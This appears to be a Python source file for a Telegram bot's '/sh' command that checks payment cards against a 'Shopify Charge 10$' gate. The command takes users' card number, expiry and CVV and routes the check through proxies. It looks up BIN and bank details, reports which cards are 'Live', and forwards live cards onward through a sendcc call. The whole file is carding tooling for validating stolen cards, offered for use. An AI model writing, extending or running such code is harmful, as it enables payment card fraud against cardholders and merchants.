import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *


@Client.on_message(filters.command("sh", [".", "/"]))
async def stripe_auth_cmd(Client, message):
    try:
        user_id  = str(message.from_user.id)
        checkall = await check_all_thing(Client , message)
        if checkall[0] == False:
            return

        role  = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = """<b>
Gate Name: Shopify Charge 10$ 💋️
CMD: /sh

Message: No CC Found in your input ❌

Usage: /sh cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc            = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""
<b>↯ CHARGE 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■□□□
⊗ GATEWAY- Shopify Charge 10$
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
<b>↯ CHARGE 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■■□
⊗ GATEWAY- Shopify Charge 10$
</b>
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start    = time.perf_counter()
        proxies  = await get_proxy_format()
        session  = httpx.AsyncClient(timeout = 30 , proxies = proxies , follow_redirects = True) 
        result   = await create_shopify_charge(fullcc , session) 
        getbin   = await get_bin_details(cc, session)
        getresp  = await get_charge_resp(result, user_id, fullcc)
        status   = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
<b>↯ CHARGE 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - Checking...
⊗ Response - ■■■■
⊗ GATEWAY- Shopify Charge 10$
</b>
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand    = getbin[0]
        type     = getbin[1]
        level    = getbin[2]
        bank     = getbin[3]
        country  = getbin[4]
        flag     = getbin[5]
        currency = getbin[6]

        finalresp = f"""
<b>↯ CHARGE 

⊗ Card - <code>{fullcc}</code> 
⊗ Status - {status}
⊗ Response - {response}
⊗ GATEWAY- Shopify Charge 10$
－－－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {cc[:6]} - {brand} - {type} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {flag} - {currency}
－－－－－－－－－－－－－－－－


Time in Progress - {time.perf_counter() - start:0.4f}sec
Credit Deducted - 1
Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 💋️ [ {role} ]
Updates  - <a href="https://t.me/NoMoreBins">三 𝙉𝙤 𝙈𝙤𝙧𝙚 𝘽𝙞𝙣𝙨 三</a>
Owner - <a href="https://t.me/stripe_xD">>⏤͟͞🇧🇩⌁𝙒𝙞𝙣𝙩𝙚𝙧𝙜𝙧𝙚𝙚𝙣 𝙈𝙖𝙧𝙨ヤ</a>

"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if status == "Live 🟢" or status == "Live 🟡":
            await sendcc(finalresp, session)
        await session.aclose()

    except:
        import traceback
        await error_log(traceback.format_exc())
